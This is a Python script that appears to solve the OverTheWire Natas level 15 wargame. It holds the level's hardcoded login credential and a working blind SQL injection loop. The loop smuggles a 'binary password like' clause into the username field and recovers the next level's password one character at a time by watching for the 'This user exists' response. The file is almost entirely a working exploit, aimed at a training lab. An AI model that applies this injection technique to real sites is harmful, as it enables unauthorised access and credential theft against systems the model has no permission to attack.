import requests
from string import *

characters = ascii_lowercase + ascii_uppercase + digits
base_username = "natas15"
base_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = "http://natas15.natas.labs.overthewire.org/"
password = ""

while len(password) < 32:
    for char in characters:
        print('trying ' + char)
        response = requests.post(url,
                                 data={"username": 'natas16" AND binary password like "' + password + char + '%%" # '},
                                 auth=(base_username, base_password))
        content = response.text
        if 'This user exists' in content:
            password += char
            print(password)
            break
